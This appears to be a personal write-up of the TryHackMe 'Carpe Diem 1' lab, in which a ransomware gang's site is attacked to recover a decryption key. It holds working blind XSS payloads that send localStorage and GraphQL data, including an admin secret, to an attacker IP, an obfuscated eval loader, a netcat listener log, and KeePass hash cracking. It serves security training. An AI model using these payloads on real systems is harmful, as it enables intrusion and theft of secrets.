<p>2025, August 8 - Day 459</p>
<h1>Carpe Diem 1</h1>

<p>Icon</p>
<img width="225" height="225" alt="image" src="https://github.com/user-attachments/assets/d7ddcf08-e642-4f6d-bd67-4dbf4c7ca0c9" />

<p>Recover your clients encrypted files before the ransomware timer runs out!</p>

<p>Header</p>

<img width="1887" height="381" alt="image" src="https://github.com/user-attachments/assets/6ba9e8ef-5cde-4309-b72e-0120dce9cf05" />

<p>Link</p>
https://tryhackme.com/room/carpediem1


<br>

<h2>Task 1 . Pay...back!</h2>

<p>One of your clients has been hacked by the Carpe Diem cyber gang and all their important files have been encrypted. They have hired you to help them recover an important file that they need to restore their backups. They have contacted the carpe diem cybergang and paid a ransom but have not heard anything back.<br>

The countdown timer is ticking since they visited and they are now running out of time to recover their data before the keys are deleted on the server. Can you retrieve the keys and help your client restore their data before time runs out?<br>

The file is available to download on the machine: <code>/downloads/Database.carp</code></p>





<br>

<h3>Nmap</h3>

```bash
:~/CarpeDiem1# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Home
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33326/tcp6  status
|   100024  1          41928/udp6  status
|   100024  1          55158/udp   status
```

<br>

<h3>/etc/hosts</h3>

```bash
TargetIP   c4rp3d13m.net
```

<br>

<h3>Web 80</h3>

<p>
- BTC = bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj<br>
- url = http://c4rp3d13m.net/proof/</p>

<img width="1208" height="685" alt="image" src="https://github.com/user-attachments/assets/e8c9a1c8-8728-4690-92e2-acb4eb827c81" />


<br>

<h3>Database.carp</h3>

<img width="1222" height="176" alt="image" src="https://github.com/user-attachments/assets/59e16d2f-7366-47f4-91f5-8b94a8fc918d" />


<br>

<h3>/downloads</h3>


<img width="1195" height="309" alt="image" src="https://github.com/user-attachments/assets/2515b97d-d6bb-41e0-9c2c-aa219eed47ae" />

<p>decrypt_linux_amd64</p>

<img width="402" height="51" alt="image" src="https://github.com/user-attachments/assets/686832e4-825a-4f71-b7bb-7221300df9db" />

<br>

```bash
:~/CarpeDiem1# file decrypt_linux_amd64
decrypt_linux_amd64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Q-qwIhmYLL9O7nxtkSFl/ALutoQld-L8sj0x8TtDr/APPpThdSM2NmXJG6XglT/CwEqr2HOjAvrporc6crE, not stripped
```

<br>

<h3>//c4rp3d13m.net</h3>

<p><em>Request</em></p>

```bash
GET / HTTP/1.1
Host: c4rp3d13m.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Sat, 09 Aug 2025 00:14:54 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Powered-By: Express
Set-Cookie: session=MTAuMjAxLjczLjExMA%3D%3D; Max-Age=900; Path=/; Expires=Sat, 09 Aug 2025 00:29:54 GMT; HttpOnly
Set-Cookie: countdown=2025-08-08T23%3A43%3A34.992958; Max-Age=900; Path=/; Expires=Sat, 09 Aug 2025 00:29:54 GMT
Last-Modified: Saturday, 09-Aug-2025 00:14:54 GMT
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
Content-Length: 3927

<!DOCTYPE html><html><head><title>Home</title><link rel="stylesheet" href="/stylesheets/style.css"></head><body><div class="main container"><div class="row"></div><center><h1>Carpe Diem</h1><h3>All your data are belong to us!</h3><p></p><p><pre>   uu$:$:$:$:$:$uu
    uu$$$$$$$$$$$$$$$$$uu
   u$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$*   *$$$*   *$$$$$$u
  $$$$*      u$u       $$$$*
  $$$u       u$u       u$$$
  $$$u      u$$$u      u$$$
  *$$$$uu$$$   $$$uu$$$$*
  *$$$$$$$*   *$$$$$$$*
   u$$$$$$$u$$$$$$$u
   u$*$*$*$*$*$*$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$u$u$u$u$u$$       u$$$$
  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
u$$$$$$$$$$$      *****    uuuu$$$$$$$$$
$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
 ***      **$$$$$$$$$$$uu **$***
          uuuu **$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 $$$$$$$$$$****           **$$$$$$$$$$$*
   *$$$$$*                      **$$$$** </pre><h4></h4><h2>Your key will be deleted:</h2><h3>Sat Aug 09 2025 07:43:34 GMT+0000</h3><div id="counter"></div><script>function aaa(wallet) {
  var wallet = wallet;
  if (wallet.trim() === 'bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj'){
    alert('Hey! \n\nstupid is as stupid does...');
    return;
  }

var re = new RegExp("^([a-z0-9]{42,42})$");
if (re.test(wallet.trim())) {
  var http = new XMLHttpRequest();
  var url = 'http://c4rp3d13m.net/proof/';
  http.open('POST', url, true);
  http.setRequestHeader('Content-type', 'application/json');
  var d = '{"size":42,"proof":"'+wallet+'"}';
  http.onreadystatechange = function() {
  if(http.readyState == 4 && http.status == 200) {
    //alert(http.responseText);
    }
    }
      http.send(d);
    } else {
    alert('Invalid wallet!');
    }
    }
</script><script>function clippy() {
var copyText = document.getElementById("pay");
copyText.select();
copyText.setSelectionRange(0, 99999)
document.execCommand("copy");
alert("Copied: " + copyText.value);
}</script><script>// Set the date we're counting down to
var countdown = document.cookie
var countdown = countdown.replace(/%3A/g, ":");
var countdown = countdown.replace("countdown=", "");

var countDownDate = new Date(countdown);
countDownDate.setHours(countDownDate.getHours() + 8);
countDownDate = new Date(countDownDate).getTime();

// Update the count down every 1 second
var x = setInterval(function() {

 // Get today's date and time
var now = new Date().getTime();

// Find the distance between now and the count down date
var distance = countDownDate - now;

// Time calculations for days, hours, minutes and seconds
var days = Math.floor(distance / (1000 * 60 * 60 * 24));
var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var seconds = Math.floor((distance % (1000 * 60)) / 1000);

// Output the result in an element with id="demo"
document.getElementById("counter").innerHTML = days + "d " + hours + "h "+ minutes + "m " + seconds + "s ";

// If the count down is over, write some text
if (distance < 0) {
clearInterval(x);
document.getElementById("counter").innerHTML = "KEY DELETED. YOU SHOULD HAVE PAYED!";
}
}, 1000);
</script><div class="col-md-6 col-md-offset-3"><h1 class="display-4 m-b-2"></h1><form></form><table><tr><td><label for="pay">BTC:</label></td><td><input type="text" id="pay" value="bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj" name="pay" readonly class="form-control"></td><td><button type="button" onclick="clippy(pay.value)" class="btn btn-primary">Copy</button></td></tr><tr><td><label for="receipt">Proof:</label></td><td><input type="text" id="wallet" placeholder="Your wallet" name="wallet" class="form-control"></td><td><button type="button" onclick="aaa(wallet.value)" class="btn btn-primary">Send</button></td></tr></table><p></p></div></p></center></div></body></html>
```

<br>

<h3>//c4rp3d13m.net/proof/</h3>

<p><em>Request</em></p>

```bash
GET /proof HTTP/1.1
Host: c4rp3d13m.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=MTAuMjAxLjczLjExMA%3D%3D; countdown=2025-08-08T23%3A43%3A34.992958
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<p><em>Response</em></p>

```bash
HTTP/1.1 404 Not Found
Server: nginx/1.6.2
Date: Sat, 09 Aug 2025 00:02:11 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Powered-By: Express
Content-Length: 152

<!DOCTYPE html><html><head><title></title><link rel="stylesheet" href="/stylesheets/style.css"></head><body><h1>Not Found</h1><h2>404</h2></body></html>
```

<br>

<p>---------------------------------------------</p>

<br>

<p><em>Request</em></p>

```bash
POST /proof HTTP/1.1
Host: c4rp3d13m.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=MTAuMjAxLjczLjExMA%3D%3D; countdown=2025-08-08T23%3A43%3A34.992958
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 68

{"size":20,"proof":"bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj"}
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Sat, 09 Aug 2025 00:04:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 10
Connection: close
X-Powered-By: Express
ETag: W/"a-hEe8OvkEep9LUrtsayAyx5Brl0I"
Last-Modified: Saturday, 09-Aug-2025 00:04:43 GMT
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0

Really?...
```

<br>

<p>---------------------------------------------</p>

<br>

<p><em>Request</em></p>
<p>

- session = MTAuMjAxLjczLjExMA%3D%3D<br>
- countdown = 2025-08-08T23%3A43%3A34.992958<br>
- x-hasura-admin-secret : 's3cr3754uc35432<br>
- //192.168.150.10/v1/graphql/</p>

```bash
POST /proof HTTP/1.1
Host: c4rp3d13m.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=MTAuMjAxLjczLjExMA%3D%3D; countdown=2025-08-08T23%3A43%3A34.992958
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 91

{"size":400,"proof":"bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hjRRRRRRRRRRRRRRRRRRRRRR"}
```

<p><em>Response</em></p>
<p>

- 
</p>

```bash
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Sat, 09 Aug 2025 00:07:15 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Last-Modified: Saturday, 09-Aug-2025 00:07:15 GMT
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
Content-Length: 758

bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hjRRRRRRRRRRRRRRRRRRRRRRrequest.post({ headers:
{'content-type' : 'application/json','x-hasura-admin-secret' : 's3cr3754uc35432' error
connecting to http://192.168.150.10/v1/graphql/
```


<br>
<br>
<br>


<p>https://labs.withsecure.com/publications/getting-real-with-xss</p>

```bash
var xhr=new XMLHttpRequest();
xhr.open('GET','http://10.201.73.110:4444/?q='+JSON.stringify(localStorage));
xhr.send();
```

<p>Proof:</p>

```bash
<script src='http://10.201.73.110:8000/exploit.js'></script>
```

```bash
PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMC4yMDEuNzMuMTEwOjgwMDAvZXhwbG9pdC5qcyc+PC9zY3JpcHQ+
```

<br>

<h3>Top</h3>

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.29.233 - - [09/Aug/2025 01:35:19] "GET /exploit.js HTTP/1.1" 200 -
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on TargetIP 38867
GET /?q=%7B%22secret%22:%22s3cr3754uc35432%22,%22flag1%22:%22THM%7BSo_Far_So_Good_So_What%7D%22%7D HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Referer: http://192.168.150.13:5000/
Origin: http://192.168.150.13:5000
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: AttackIP:4444
```

<br>

<img width="852" height="189" alt="image" src="https://github.com/user-attachments/assets/a15ebb3b-b9d4-4fc7-bd41-1c08f2dfac63" />


<br>

<h3>grap_ql.js</h3>

```bash
var xhr = new XMLHttpRequest();
var q = '{"query": "fragment FullType on __Type {  kind  name  description  fields(includeDeprecated: true) {    name    description    args {      ...InputValue    >
// xhr.setRequestHeader('Content-Type', 'application/json');
xhr.open("POST", "http://192.168.150.10:8080/v1/graphql/", true);
xhr.setRequestHeader('x-hasura-admin-secret','s3cr3754uc35432');

xhr.onreadystatechange=function() {
    if (this.readyState === 4) {
        var r = new XMLHttpRequest();
        r.open('GET','http://10.201.73.110:4444/?data='+btoa(this.responseText),false);
        r.send();
    }
}

xhr.send(q);
```



```bash
eval(atob('dmFyIGEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKdmFyIGQgPSAneyJxdWVyeSI6IntfX3NjaGVtYXt0eXBlc3tuYW1lfX19In0nOwphLm9wZW4oIlBPU1QiLCAiaHR0cDovLzE5Mi4xNjguMTUwLjEwOjgwODAvdjEvZ3JhcGhxbC8iLCB0cnVlKTsKYS5zZXRSZXF1ZXN0SGVhZGVyKCd4LWhhc3VyYS1hZG1pbi1zZWNyZXQnLCdzM2NyMzc1NHVjMzU0MzInKTsKYS5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy5yZWFkeVN0YXRlPT09NCkgewogICAgICAgIHZhciBiPW5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgIGIub3BlbignR0VUJywnaHR0cDovMTAuMjAxLjczLjExMDo4MDAwLz9zdGF0dXM9Jyt0aGlzLnN0YXR1cysnJmxvY2Fsc3RvcmFnZT0nK2J0b2EoSlNPTi5zdHJpbmdpZnkobG9jYWxTdG9yYWdlKSkrJyZkYXRhPScrYnRvYSh0aGlzLnJlc3BvbnNlVGV4dCksZmFsc2UpOwogICAgICAgIGIuc2VuZCgpOwogICAgfQp9CmEuc2VuZChkKTs=='));
```


<img width="1237" height="497" alt="image" src="https://github.com/user-attachments/assets/c9a68dbf-da30-473d-a9df-43a806e3e034" />


```bash
GET /?status=200&localstorage=eyJzZWNyZXQiOiJzM2NyMzc1NHVjMzU0MzIiLCJmbGFnMSI6IlRITXtTb19GYXJfU29fR29vZF9Tb19XaGF0fSJ9&data=eyJkYXRhIjp7Il9fc2NoZW1hIjp7InR5cGVzIjpbeyJuYW1lIjoiQm9vbGVhbiJ9LHsibmFtZSI6IkZsb2F0In0seyJuYW1lIjoiSUQifSx7Im5hbWUiOiJJbnQifSx7Im5hbWUiOiJJbnRfY29tcGFyaXNvbl9leHAifSx7Im5hbWUiOiJTdHJpbmcifSx7Im5hbWUiOiJTdHJpbmdfY29tcGFyaXNvbl9leHAifSx7Im5hbWUiOiJfX0RpcmVjdGl2ZSJ9LHsibmFtZSI6Il9fRGlyZWN0aXZlTG9jYXRpb24ifSx7Im5hbWUiOiJfX0VudW1WYWx1ZSJ9LHsibmFtZSI6Il9fRmllbGQifSx7Im5hbWUiOiJfX0lucHV0VmFsdWUifSx7Im5hbWUiOiJfX1NjaGVtYSJ9LHsibmFtZSI6Il9fVHlwZSJ9LHsibmFtZSI6Il9fVHlwZUtpbmQifSx7Im5hbWUiOiJjb25mbGljdF9hY3Rpb24ifSx7Im5hbWUiOiJtdXRhdGlvbl9yb290In0seyJuYW1lIjoib3JkZXJfYnkifSx7Im5hbWUiOiJxdWVyeV9yb290In0seyJuYW1lIjoic3Vic2NyaXB0aW9uX3Jvb3QifSx7Im5hbWUiOiJ0aW1lc3RhbXAifSx7Im5hbWUiOiJ0aW1lc3RhbXBfY29tcGFyaXNvbl9leHAifSx7Im5hbWUiOiJ2aWN0aW1zIn0seyJuYW1lIjoidmljdGltc19hZ2dyZWdhdGUifSx7Im5hbWUiOiJ2aWN0aW1zX2FnZ3JlZ2F0ZV9maWVsZHMifSx7Im5hbWUiOiJ2aWN0aW1zX2FnZ3JlZ2F0ZV9vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfYXJyX3JlbF9pbnNlcnRfaW5wdXQifSx7Im5hbWUiOiJ2aWN0aW1zX2F2Z19maWVsZHMifSx7Im5hbWUiOiJ2aWN0aW1zX2F2Z19vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfYm9vbF9leHAifSx7Im5hbWUiOiJ2aWN0aW1zX2NvbnN0cmFpbnQifSx7Im5hbWUiOiJ2aWN0aW1zX2luY19pbnB1dCJ9LHsibmFtZSI6InZpY3RpbXNfaW5zZXJ0X2lucHV0In0seyJuYW1lIjoidmljdGltc19tYXhfZmllbGRzIn0seyJuYW1lIjoidmljdGltc19tYXhfb3JkZXJfYnkifSx7Im5hbWUiOiJ2aWN0aW1zX21pbl9maWVsZHMifSx7Im5hbWUiOiJ2aWN0aW1zX21pbl9vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfbXV0YXRpb25fcmVzcG9uc2UifSx7Im5hbWUiOiJ2aWN0aW1zX29ial9yZWxfaW5zZXJ0X2lucHV0In0seyJuYW1lIjoidmljdGltc19vbl9jb25mbGljdCJ9LHsibmFtZSI6InZpY3RpbXNfb3JkZXJfYnkifSx7Im5hbWUiOiJ2aWN0aW1zX3NlbGVjdF9jb2x1bW4ifSx7Im5hbWUiOiJ2aWN0aW1zX3NldF9pbnB1dCJ9LHsibmFtZSI6InZpY3RpbXNfc3RkZGV2X2ZpZWxkcyJ9LHsibmFtZSI6InZpY3RpbXNfc3RkZGV2X29yZGVyX2J5In0seyJuYW1lIjoidmljdGltc19zdGRkZXZfcG9wX2ZpZWxkcyJ9LHsibmFtZSI6InZpY3RpbXNfc3RkZGV2X3BvcF9vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfc3RkZGV2X3NhbXBfZmllbGRzIn0seyJuYW1lIjoidmljdGltc19zdGRkZXZfc2FtcF9vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfc3VtX2ZpZWxkcyJ9LHsibmFtZSI6InZpY3RpbXNfc3VtX29yZGVyX2J5In0seyJuYW1lIjoidmljdGltc191cGRhdGVfY29sdW1uIn0seyJuYW1lIjoidmljdGltc192YXJfcG9wX2ZpZWxkcyJ9LHsibmFtZSI6InZpY3RpbXNfdmFyX3BvcF9vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfdmFyX3NhbXBfZmllbGRzIn0seyJuYW1lIjoidmljdGltc192YXJfc2FtcF9vcmRlcl9ieSJ9LHsibmFtZSI6InZpY3RpbXNfdmFyaWFuY2VfZmllbGRzIn0seyJuYW1lIjoidmljdGltc192YXJpYW5jZV9vcmRlcl9ieSJ9XX19fQ== HTTP/1.1" 200 
```

<br>

<img width="1351" height="549" alt="image" src="https://github.com/user-attachments/assets/f68e1c01-8671-4266-ba26-42af53977404" />

```bash
,"name":"192.168.0.12","timer":"2020-04-15T20:57:41.321097"}, {"filename":"papersize.clip","id":84,"key":"ODB2S0l3OHphNXJ0ZlpxNnFTWlNoZ3FncEFNdko4eWRRVlUyYWlTaW9sb05fVm5GeTBRNDVvS085QnFNd2drQw==","name":"192.168.16.53","timer":"2020-04-16T12:44:38.647069"}, {"filename":"my_keys.xls","id":76,"key":"dnYzcWJKcnk1aVFUQmd2Z0h5QURyUkpuSEpjOFVTOC5rVTE1MS5jZ2laZk9Yb21JaHl2VkZ3RU9NQ2NXamVLQQ==","name":"192.168.16.65","timer":"2020-04-16T06:43:27.542364"}, {"filename":"Your_shadow.docx","id":77,"key":"dklTN3VLZmd1VWFDaVZWeDlLWEtzd0gwcVg2TUVMcmNVak10bGFQdDZYZ29HMXVfci5DbHRwbkNRV0s5dGVKTg==","name":"10.212.134.200","timer":"2020-04-16T07:17:00.797966"}, {"filename":"No_secrets_here.txt","id":78,"key":"TTgwekpfQy5DbDZ1ckFjUERmRFRSUlJEeTdhdE10Z3k0cWZJeHNDbjhVWHJYNWlfLkN1WDRUakxEelJ3enN4Vg==","name":"10.212.134.200","timer":"2020-04-16T07:17:00.805219"}, {"filename":"deluser.conf","id":86,"key":"VlJRRmlsTGw5bXpNODFhVER5bHJUdVFlbkVyYnpIX0djUEI4b3ROU0FHWUVkelZ4X1RfTC53azZqdm1EblowbA==","name":"10.8.19.103","timer":"2023-07-11T17:01:30.809939"}, {"filename":"hostname","id":87,"key":"ZHJfZFZpdUFaZkhDNkhWYW91SGZoRmg1enRYT3NNblBod1ViS0FKaHpjdTNLVVNIZkc3UWVoTTBVeEN4dFQ4Tg==","name":"10.8.19.103","timer":"2023-07-11T17:01:30.815419"}, {"filename":"wgetrc","id":88,"key":"aHhxTXFkamJvOGF0ODF3Ni5aanFySUlUaDM1M1lSUGlwZjVsOHVhZ1ZBYjRmeUR4SWRVM0pqSmR0aUFDTEVNVw==","name":"<script src=10.8.19.103:1234/exploit.js></script>","timer":"2023-07-11T17:50:59.890773"}, {"filename":"miredo.conf","id":89,"key":"VFZuUmROVVRFcHg5LkpxaHk1aFNPZzM5SWFXSEhlajc5VGh4X1RWTnZOZTVMSkh5YjVuM1NIOGJ0bXguSEVZLg==","name":"<script src=10.8.19.103/exploit.js></script>","timer":"2023-07-11T18:03:08.051348"}, {"filename":"ethertypes","id":90,"key":"T001dElZb0lZNzFvQUFrQkZKQkhvZVEweVJCVUtjUUMucHZ0M0VKU3FXT3Z3SWxHVUpsazdlMkVaYmtkOTRyWQ==","name":"<script src=10.8.19.103/exploit.js></script>","timer":"2023-07-11T18:03:08.055864"}, {"filename":"login.defs","id":91,"key":"WVB0VjdkLlhKZFh1NkN4VS5PSjFDNzYuMUFyR0FTYkhJSVVsMFJzZ1lCUVowNFlHQjl3dHFua2ZoNk8zbGFOQw==","name":"<script src='http://10.8.19.103:1234/exploit.js'></script>","timer":"2023-07-11T18:12:33.305679"}, {"filename":"ca-certificates.conf","id":92,"key":"SzRWYlhtRVJZN2dEVEtWR2djVEQ1b3MxR3NoNEU5a05hX1RQS1pUN0RiZDVEVVRpZ2FJV2NPLmxKUGdFbXRJcg==","name":"<script src='http://10.8.19.103:1234/graph_ql.js'></script>","timer":"2023-07-11T18:31:04.238391"}, {"filename":"su.doc","id":93,"key":"V3BxX1JyVG52akwwZzhTSW1HREpaUFpMaVJnUUJvYWMub2dWUFo0MFlSNk0ua0ZYR3l0UmJYVHZ0dEE2VFRiVg==","name":"<script src='http://10.8.19.103:1234/graph_ql_key.js'></script>","timer":"2023-07-11T19:32:19.485197"}]}}
```

<img width="1912" height="839" alt="image" src="https://github.com/user-attachments/assets/8d35eda9-65de-4322-a657-761dd1728832" />


```bash
14T10:56:35.669927"}, {"filename":"Database.kbxd","id":48,"key":"F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg==","name":"195.204.178.84","timer":"2020-04-
```


<h3>a.py</h3>


```bash
:~# cat a.py
#!/usr/bin/python3
# get all possible combinatins from a set of arguments
from itertools import permutations
import sys
import os

ports_list = sys.argv[1:]
perm = permutations(ports_list)

for i in list(perm):
	u = os.popen("echo './decrypt_linux_amd64 %s'|tr -d '('|tr -d ')'|tr -d ','" % str(i)).read()
	print(u.strip('\n'))
```



```bash
:~# python3 a.py 'Database.carp' 'Database.kbxd' 'F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg==' | tee report.txt
./decrypt_linux_amd64 Database.carp Database.kbxd F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg==
./decrypt_linux_amd64 Database.carp F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg== Database.kbxd
./decrypt_linux_amd64 Database.kbxd Database.carp F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg==
./decrypt_linux_amd64 Database.kbxd F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg== Database.carp
./decrypt_linux_amd64 F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg== Database.carp Database.kbxd
./decrypt_linux_amd64 F+lRG6As2e1qBd3/7dPTvcmcluUEjMwkq22K6zBIcP8ZF1LuJLsarUKgmhw+P8oZvBSJUXGiGVcRuHxbnQY8Tg== Database.kbxd Database.carp
```

```bash
:~# cat report.txt |while read i;do $i;ls -lat |grep '.kbxd';done
Key decode error: illegal base64 data at input byte 8
---x--x---  1 root root    2174 Aug  9 03:03 Database.kbxd.decrypt
---x--x---  1 root root    2174 Aug  9 03:03 Database.kbxd.decrypt
```



```bash
:~# file Database.kbxd.decrypt
Database.kbxd.decrypt: Keepass password database 2.x KDBX
```

```bash
:~# ./keepass2john
Usage: ./keepass2john [-k <keyfile>] <.kdbx database(s)>
```

```bash
:~# ./keepass2john Database.kbxd.decrypt > Database.kbxd.hash
```


```bash
:~#  john --wordlist=/usr/share/wordlists/rockyou.txt Database.kbxd.hash
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
antonella        (Database.kbxd.decrypt)
1g 0:00:00:48 DONE (2025-08-09 03:16) 0.02063g/s 77.93p/s 77.93c/s 77.93C/s antonella..happydays
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
apt install keepassxc
```

```bash
keepassxc-cli ls Database.kdbx.decrypt
```


```bash
:~# keepassxc-cli ls Database.kbxd.decrypt
Insert password to unlock Database.kbxd.decrypt: 
THM
General/
Windows/
Network/
Internet/
eMail/
Homebanking/
Recycle Bin/
```

```bash
:~# keepassxc-cli show Database.kbxd.decrypt THM
Insert password to unlock Database.kbxd.decrypt: 
Title: THM
UserName: root
Maximum depth of replacement has been reached. Entry uuid: {531b7ab3-73b9-914e-a55c-756fa66edb73}
Password: THM{You_Found_TheFLag_Well_Done!}
URL: 
Notes: 
```

<br>
<br>


<img width="1891" height="884" alt="image" src="https://github.com/user-attachments/assets/f07e215e-6ffa-46eb-a985-97c8d26e393c" />

<img width="1892" height="892" alt="image" src="https://github.com/user-attachments/assets/a3e12ff8-e697-49f4-b904-8815b84fe38a" />


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 8    |   459    |     132nd    |      5ᵗʰ     |     425ᵗʰ   |    14ᵗʰ    | 119,768  |    904    |    73     |


<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/1d6d1d38-ca1e-4e5d-9830-469858211b89" />

<img width="1891" height="894" alt="image" src="https://github.com/user-attachments/assets/a6e71e99-f53e-42f1-9e9b-f3a71aaa4d01" />

<img width="1891" height="891" alt="image" src="https://github.com/user-attachments/assets/6f9e118c-a93f-4f38-b3ba-e1e7a8ab20a6" />

<img width="1894" height="895" alt="image" src="https://github.com/user-attachments/assets/5d2fd2be-f20f-46cc-9ee8-9ed67fd4fd50" />

<img width="1893" height="895" alt="image" src="https://github.com/user-attachments/assets/d70a896f-f75d-49e0-9bfb-266a9be5b024" />
